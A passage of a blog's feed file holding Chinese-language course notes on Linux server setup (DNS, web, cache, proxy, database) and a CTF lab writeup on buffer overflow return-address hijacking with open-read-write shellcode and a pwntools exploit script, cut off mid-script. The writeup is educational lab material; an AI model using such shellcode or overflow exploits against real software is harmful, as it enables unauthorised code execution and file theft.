class="string">adduser</span> &#123;&#123; <span class="string">item.name</span> &#125;&#125; </span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.name &#125;&#125;</span>&quot;</span> </span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.user_id &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user_lists &#125;&#125;</span>&quot;</span> </span><br><span class="line">      <span class="attr">register:</span> <span class="string">useradd_result</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">print</span> <span class="string">results</span> </span><br><span class="line">      <span class="attr">ansible.builtin.debug:</span></span><br><span class="line">        <span class="attr">msg:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        An user is add with name &#123;&#123; item.name &#125;&#125; </span></span><br><span class="line"><span class="string"></span>      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; useradd_result. results &#125;&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div></li></ul><h2 id="æœŸæœ«è€ƒæ•´ç†"><a href="#æœŸæœ«è€ƒæ•´ç†" class="headerlink" title="æœŸæœ«è€ƒæ•´ç†"></a>æœŸæœ«è€ƒæ•´ç†</h2><p><code>DNS Http varnish database</code></p><p><a class="link"   href="https://www.youtube.com/watch?v=VhXenrYuYcE" >DNS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://www.youtube.com/watch?v=0em4LrNN_v8" >HTTP_server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://www.youtube.com/watch?v=q14Aunuv9WU" >Https cerify ~1:10:00 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://www.youtube.com/watch?v=q14Aunuv9WU" >Varnish and haproxy 1:10:00 ~  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a href="">Database</a></p>]]></content>
      
      
      <categories>
          
          <category> csie </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csie </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTTU ä¼ºæœå™¨åŸç† WriteUp</title>
      <link href="/2024/08/06/server/"/>
      <url>/2024/08/06/server/</url>
      
        <content type="html"><![CDATA[<ol><li>Ansible</li><li>SELinux</li></ol><h2 id="DNS-server"><a href="#DNS-server" class="headerlink" title="DNS server"></a>DNS server</h2><h3 id="Intro-2023-09-20"><a href="#Intro-2023-09-20" class="headerlink" title="Intro (2023.09.20)"></a>Intro (2023.09.20)</h3><ol><li><p>SELinux review</p><ul><li><code>ls -lZ</code></li><li><code>semanage</code></li><li><code>setenforce</code></li><li><code>chcon</code></li><li><code>firewalld</code></li></ul></li><li><p>åè©è§£é‡‹</p><ul><li>DNS : Domain name service</li><li>FQDN : Fully Qualified Domain Name</li><li>Domain</li><li>Subdomain</li><li><strong>Zone</strong> : Depand on Domain manager</li></ul></li><li><p>client</p><ul><li><code>/etc/nsswitch.conf</code> (Name Sever Switch)</li><li><code>/etc/hosts</code> : Test usage , contains IP host names and addresses for the local host and other hosts in the Internet network</li><li><code>/etc/resolv.conf</code> : DNS</li></ul></li><li><p>Command</p><ul><li><code>host</code></li><li><code>nslooup</code></li></ul></li><li><p>DNS Port</p><ul><li><code>53</code> tcp , udp</li></ul></li><li><p>DNS resource record</p><ul><li><code>host -v -t A example.com</code><br>  -&gt; <code>example.com. 86400 IN A 172.25.254.254</code></li><li>A : Ipv4</li><li>AAAA : Ipv6</li><li>SOA</li><li>NS : Name Server</li><li>MX : Mail Exchange</li><li>CNAME : Cononical Name</li><li>TXT : Text</li><li>SRV : Service</li></ul></li></ol><p><a class="link"   href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/9/html/managing_networking_infrastructure_services/assembly_setting-up-and-configuring-a-bind-dns-server_networking-infrastructure-services" >RedHat Document <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Bind-Named-2023-09-27"><a href="#Bind-Named-2023-09-27" class="headerlink" title="Bind_Named (2023.09.27)"></a>Bind_Named (2023.09.27)</h3><h4 id="Directery"><a href="#Directery" class="headerlink" title="Directery"></a>Directery</h4><ul><li><code>/var/named/</code> ä¸»è¦ç›®éŒ„</li><li><code>/var/named/slaves/</code> secondary zones ä½¿ç”¨</li><li><code>/var/named/dynamic/</code> dynamic DNS (DDNS) zones æˆ– DNSSEC keys.</li><li><code>/var/named/data/</code> çµ±è¨ˆèˆ‡é™¤éŒ¯æª”æ¡ˆ</li></ul><h4 id="Ways"><a href="#Ways" class="headerlink" title="Ways"></a>Ways</h4><ul><li>æ­£æŸ¥</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dnf</span> install bind-chroot</span><br><span class="line"><span class="variable">$vim</span> /etc/named.conf : <span class="comment"># setup zone</span></span><br><span class="line">    <span class="comment"># add ip addr and change allow to any</span></span><br><span class="line">    <span class="comment"># **Add Text** :</span></span><br><span class="line">        zone <span class="string">&quot;LLL.tw&quot;</span> IN &#123;</span><br><span class="line">            <span class="built_in">type</span> master;</span><br><span class="line">            file <span class="string">&quot;LLL.tw.zone&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$cd</span> /var/named</span><br><span class="line"><span class="variable">$cp</span> named.empty LLL.tw.zone</span><br><span class="line"><span class="variable">$vim</span> LLL.tw.zone</span><br></pre></td></tr></table></figure></div><ul><li><code>LLL.tw.zone</code></li></ul><div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$TTL 86400</span><br><span class="line">$ORIGIN LLL.tw.</span><br><span class="line">@       IN      SOA     dns1.example.com. admin.example.com.( #åŸŸåä¼ºæœå™¨çš„åç¨± ç®¡ç†è€…éƒµç®± </span><br><span class="line">                       2022010101  ; Serial</span><br><span class="line">                       3600        ; Refresh</span><br><span class="line">                       1800        ; Retry</span><br><span class="line">                       604800      ; Expire</span><br><span class="line">                       86400       ; Minimum TTL</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">        NS     dns1.example.com.</span><br><span class="line">www     IN      A    172.25.250.10</span><br></pre></td></tr></table></figure></div><p>$systemctl restart named<br>$chown root.named LLL.tw.zone</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$firewall</span>-cmd --permanent --add-service=dns</span><br><span class="line"><span class="variable">$firewall</span>-cmd --reload</span><br><span class="line"></span><br><span class="line"><span class="variable">$nmcli</span> con mod <span class="string">&quot;Net1&quot;</span> ipv4.dns 172.25.250.10</span><br><span class="line"><span class="variable">$nmcli</span> con reload</span><br><span class="line"></span><br><span class="line"><span class="comment"># To other machine</span></span><br><span class="line"><span class="variable">$dig</span> @172.25.250.10 dns.servera.tw</span><br></pre></td></tr></table></figure></div><ul><li><p>Command history</p><p>  <img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/S16vfJEZp.png"                      alt="image"                ></p></li><li><p>åè§£</p></li></ul><div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$TTL 86400</span><br><span class="line">@       IN      SOA     ns1.example.com. admin.example.com. (</span><br><span class="line">                       2022010101  ; Serial</span><br><span class="line">                       3600        ; Refresh</span><br><span class="line">                       1800        ; Retry</span><br><span class="line">                       604800      ; Expire</span><br><span class="line">                       86400       ; Minimum TTL</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@       IN      NS      ns1.example.com.</span><br><span class="line"></span><br><span class="line">1       IN      PTR     example.com.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="Unbound"><a href="#Unbound" class="headerlink" title="Unbound"></a>Unbound</h3><ul><li><code>/etc/unbound/unbound.conf</code></li></ul><div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local-zone: &quot;example.com.&quot; static</span><br><span class="line">local-data: &quot;example.com. IN A 192.168.1.100&quot;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> <span class="built_in">chown</span> -R unbound:unbound /var/lib/unbound</span><br><span class="line"><span class="variable">$sudo</span> systemctl restart unbound</span><br></pre></td></tr></table></figure></div><h2 id="Web-server"><a href="#Web-server" class="headerlink" title="Web server"></a>Web server</h2><h3 id="HTTPd"><a href="#HTTPd" class="headerlink" title="HTTPd"></a>HTTPd</h3><h4 id="Custom-web-page"><a href="#Custom-web-page" class="headerlink" title="Custom web page"></a>Custom web page</h4><ul><li><p>Basic config<code>/etc/httpd/conf/http.conf</code></p></li><li><p>custom <code>*.conf</code> add in <code>/etc/httpd/conf.d</code></p>  <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;/var/www/html/user&quot;&gt;</span><br><span class="line">    AllowOverride None</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    DocumentRoot &quot;/var/www/html/user&quot;</span><br><span class="line">    ServerName www.user.tw</span><br><span class="line">    ServerAdmin lll@nttu.edu.tw</span><br><span class="line">    ErrorLog &quot;logs/user_error_log&quot;</span><br><span class="line">    CustomLog &quot;logs/user_cos_log&quot; combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure></div></li><li><p>and add dir in <code>/var/www/html/</code></p></li></ul><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><ul><li><code>/etc/nginx/nginx.conf</code></li><li><code>/etc/nginx/conf.d</code></li><li>Add virtual server for page <code>edit *.conf</code></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80</span><br><span class="line">    server_name www.jjli.tw; # virtual host</span><br><span class="line">    root /usr/share/nginx/html/&lt;user&gt;; # virtual host root direction.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><code>/usr/share/nginx/html</code></li></ul><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><ul><li><strong>httpd security cerify</strong><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/BJtoTV2DT.png"                      alt="image"                ></li></ul><h2 id="Cache-server"><a href="#Cache-server" class="headerlink" title="Cache server"></a>Cache server</h2><h3 id="Varnish"><a href="#Varnish" class="headerlink" title="Varnish"></a>Varnish</h3><ul><li>Modify service</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$systemctl</span> <span class="built_in">cat</span> varnish <span class="comment">#get ExecStart and modify in http_port.conf</span></span><br><span class="line"><span class="variable">$cd</span> /etc/systemd/system</span><br><span class="line"><span class="variable">$mkdir</span> varnish.service.d</span><br><span class="line"><span class="variable">$vim</span> varnish.service.d/http_port.conf</span><br></pre></td></tr></table></figure></div><ul><li><code>varnish.service.d/http_port.conf</code> daemon åƒæ•¸èª¿æ•´</li></ul><div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[service]</span><br><span class="line">ExecStart=</span><br><span class="line">ExecStart=/usr/</span><br></pre></td></tr></table></figure></div><ul><li>start service</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$systemctl</span> daemon-reload</span><br><span class="line"><span class="variable">$systemctl</span> restart varnishd</span><br><span class="line"><span class="variable">$firewall</span>-cmd --permanent --add-service=http</span><br><span class="line"><span class="variable">$firewall</span>-cmd --reload</span><br></pre></td></tr></table></figure></div><ul><li>å¿«å–é…ç½®<br><code>/etc/varnish/default.vc</code></li></ul><h2 id="Proxy-server"><a href="#Proxy-server" class="headerlink" title="Proxy server"></a>Proxy server</h2><ul><li>æ­£å‘ &amp; åå‘ä»£ç†</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/S1hykuGOp.png"                      alt="image"                ></p><ul><li>è² è¼‰å¹³è¡¡</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$vim</span> /etc/haproxy/*.conf <span class="comment"># edit frontend and backend</span></span><br><span class="line"><span class="comment"># vim</span></span><br><span class="line">frontend ll</span><br><span class="line">    <span class="built_in">bind</span> *:80</span><br><span class="line">    default_backend lll_servers</span><br><span class="line"></span><br><span class="line">backend lll_servers</span><br><span class="line">    balance &lt;roundrobin,<span class="built_in">source</span>&gt;</span><br><span class="line">    server weba 172.25.250.10:80 check inter 10s</span><br><span class="line">    server webb 172.25.250.11:80 check inter 10s</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$firewalll</span>-cmd --permanent --add-service=http <span class="comment"># open firewall for service.</span></span><br></pre></td></tr></table></figure></div><ul><li>Https è§£å¯†</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/BJB-rIav6.png"                      alt="æˆªåœ– 2023-12-30 16.29.44"                ></p><ul><li>çµ±è¨ˆ</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/B1KsPLTDT.png"                      alt="æˆªåœ– 2023-12-30 16.40.56"                ></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stats uri /&lt;url&gt; <span class="comment"># è‡ªå·±æŒ‡å®šçš„ç¶²é åç¨±</span></span><br><span class="line">stats auth username:passwd</span><br></pre></td></tr></table></figure></div><h3 id="Varnish-haproxy"><a href="#Varnish-haproxy" class="headerlink" title="Varnish + haproxy"></a>Varnish + haproxy</h3><ul><li>varnish åœ¨haproxyå¾Œ ï¼ˆ æˆ–åœ¨haproxyå‰ ï¼‰<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/By4f9Lpvp.png"                      alt="image"                ></li></ul><h3 id="å°çµ"><a href="#å°çµ" class="headerlink" title="å°çµ"></a>å°çµ</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HydC9Lpwp.png"                      alt="image"                ></p><h2 id="DataBase"><a href="#DataBase" class="headerlink" title="DataBase"></a>DataBase</h2><ul><li>MariaDB</li><li>phpMyAdmin</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> mysql_secure_installation <span class="comment"># setup root passwd</span></span><br><span class="line"><span class="variable">$sudo</span> mysql -u root -p</span><br><span class="line"></span><br><span class="line"><span class="comment"># mariadb command</span></span><br><span class="line">CREATE DATABASE your_database_name;</span><br><span class="line">CREATE USER <span class="string">&#x27;your_username&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;your_password&#x27;</span>;</span><br><span class="line">GRANT ALL PRIVILEGES ON your_database_name.* TO <span class="string">&#x27;your_username&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sudo</span> systemctl restart mariadb</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> csie </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csie </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yuawn BOF Lab WriteUp</title>
      <link href="/2024/08/05/pwn-3/"/>
      <url>/2024/08/05/pwn-3/</url>
      
        <content type="html"><![CDATA[<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><h3 id="Hijack-ret-addr"><a href="#Hijack-ret-addr" class="headerlink" title="Hijack ret addr"></a>Hijack ret addr</h3><p><strong>rip to run call_me()</strong></p><ul><li><code>objdump -d ./bof</code></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HJhCCyF56.png"                      alt="image"                ></p><ul><li><code>sub rsp,0x30</code> &lt;- 48 bits in stack </li><li><code>rbp-ox30</code> for <code>gets()</code> input</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HyvfggYqp.png"                      alt="image"                ></p><ul><li>å¡aåˆ° <code>0x38</code> &lt;- <code>0x30</code> buf + <code>0x8</code> saved rbp</li><li>ç„¶å¾ŒåŠ ä¸Š <code>p64(call_me()çš„address)</code> &lt;- return address</li><li>å°±æœƒè·³åˆ°call_meå»åŸ·è¡Œ</li></ul><h3 id="ç¸½çµ"><a href="#ç¸½çµ" class="headerlink" title="ç¸½çµ"></a>ç¸½çµ</h3><blockquote><p><strong>è“‹ 0x30 bit æœƒåˆ° <code>rbp</code> æ‰€ä»¥è¦åŠ  8 bitè¦†è“‹rbp ä¹‹å¾Œæ‰å¡«å…¥è¦å»çš„address (ä½¿ç”¨pwntools <code>p64()</code>)</strong></p></blockquote><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><ul><li>å…ˆç”¨<code>checksec</code> æŸ¥çœ‹ <strong>seccomp &amp; arch</strong></li><li><code>x86-64 syscall</code></li><li><a class="link"   href="https://szlin.me/2017/08/23/kernel_seccomp/" >seccomp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><strong>ShellCode</strong><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mov rax ,0x67616c662f77</span><br><span class="line">push rax</span><br><span class="line">mov rax ,0x726f2f656d6f682f</span><br><span class="line">push rax</span><br><span class="line">; &#x27;/home/orw/flag&#x27; push in stack ,so it need to reverse</span><br><span class="line"></span><br><span class="line">mov rdi ,rsp </span><br><span class="line">; Pointer æŒ‡å‘ string</span><br><span class="line"></span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdx, rdx</span><br><span class="line">;å°‡ RSI å’Œ RDX å¯„å­˜å™¨æ¸…é›¶ï¼Œåˆ†åˆ¥ä½œç‚º open() ç³»çµ±èª¿ç”¨çš„ flags å’Œ mode åƒæ•¸ï¼Œè¡¨ç¤ºä¸è¨­ç½®ä»»ä½•ç‰¹æ®Šæ¨™èªŒå’Œè¨±å¯æ¬Šã€‚</span><br><span class="line"></span><br><span class="line">mov rax ,2 </span><br><span class="line">; open systemcall     </span><br><span class="line">syscall </span><br><span class="line">//open(&quot;/home/orw/flag&quot; , 0 , 0)</span><br><span class="line"></span><br><span class="line">mov rdi , rax </span><br><span class="line">;å°‡ RAX å¯„å­˜å™¨çš„è¿”å›å€¼ï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰è¨­ç½®ç‚º RDI å¯„å­˜å™¨ï¼Œä½œç‚º read() ç³»çµ±èª¿ç”¨çš„ file descriptor åƒæ•¸ã€‚</span><br><span class="line"></span><br><span class="line">mov rsi,rsp ;å°‡ RSP å¯„å­˜å™¨çš„åœ°å€è¨­ç½®ç‚º RSI å¯„å­˜å™¨ï¼Œä½œç‚º read() ç³»çµ±èª¿ç”¨çš„ buffer åƒæ•¸ã€‚</span><br><span class="line"></span><br><span class="line">mov rdx ,0x50 ;å°‡ RDX å¯„å­˜å™¨è¨­ç½®ç‚ºè¦è®€å–çš„å­—ç¯€æ•¸ï¼ˆ0x50ï¼Œ80 å­—ç¯€ï¼‰ã€‚</span><br><span class="line">mov rax,0</span><br><span class="line">systemcall</span><br><span class="line">// read( fd , rsp , 0x50 )</span><br><span class="line"></span><br><span class="line">mov rdi ,1 ;å°‡ RDI å¯„å­˜å™¨è¨­ç½®ç‚º 1ï¼Œä½œç‚º write() ç³»çµ±èª¿ç”¨çš„ file descriptor åƒæ•¸ã€‚</span><br><span class="line">mov rax ,1 ;å°‡ RAX å¯„å­˜å™¨è¨­ç½®ç‚º 1ï¼Œè¡¨ç¤º write ç³»çµ±èª¿ç”¨ã€‚</span><br><span class="line">systemcall </span><br><span class="line">// write( 1 , rsp , 0x50 )</span><br></pre></td></tr></table></figure></div></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/BytXUdw2p.png"                      alt="image"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/H1fsJz166.png"                      alt="image"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HyebrGJTp.png"                      alt="image"                ></p><ul><li><p><strong><code>.bss</code> çš„èµ·å§‹ä½ç½®æ˜¯<code>0x601060</code> ç‚ºä»€éº¼ <code>sc</code> æ˜¯ <code>0x6010a0</code></strong></p><ul><li>å› å‰é¢æ˜¯å¡äº† <code>stdout,stdin,stderr</code></li></ul>  <div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stderr,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p><code>.bss -&gt; sc[0x100]</code> </p></li><li><p><code>r.sendafter(b&#39;:)&#39; ,b&#39;a&#39;*18 + p64(0x6010a0))</code></p></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">y = remote( <span class="string">&#x27;192.168.108.1&#x27;</span> , <span class="number">10171</span> )</span><br><span class="line"><span class="comment">#y = remote( &#x27;edu-ctf.csie.org&#x27; , 10171 )</span></span><br><span class="line"><span class="comment"># y = process( &#x27;orw&#x27; )</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># handcraft assembly</span></span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f77</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rax, 0x726f2f656d6f682f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    // open( &quot;/home/orw/flag&quot; , 0 , 0 )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x50</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    // read( fd , rsp , 0x50 )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    // write( 1 , rsp , 0x50 )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwnlib shellcraft</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sc = asm(</span></span><br><span class="line"><span class="string">    shellcraft.pushstr( &quot;/home/orw/flag&quot; ) +</span></span><br><span class="line"><span class="string">    shellcraft.open( &#x27;rsp&#x27; , 0 , 0 ) + </span></span><br><span 